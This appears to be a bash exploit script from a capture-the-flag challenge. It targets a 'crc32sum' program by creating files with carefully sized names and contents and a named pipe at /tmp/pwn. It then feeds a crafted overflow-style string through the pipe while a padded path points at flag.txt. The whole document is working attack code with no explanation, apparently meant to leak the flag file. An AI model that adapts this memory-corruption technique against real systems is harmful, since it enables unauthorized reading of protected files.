#!/bin/bash
echo -n aaaaaaaaaaaaaaaa > aaaaaaaaaaaaaaaa
echo -n bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb > bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
echo -n cccccccccccccccccccccccccccccccccccccccccccccccc > cccccccccccccccccccccccccccccccccccccccccccccccc

mkfifo /tmp/pwn

crc32sum \
    bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb \
    aaaaaaaaaaaaaaaa \
    cccccccccccccccccccccccccccccccccccccccccccccccc \
    /tmp/pwn \
    .///////////////////////////////////////flag.txt &

echo -n AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP > /tmp/pwn 
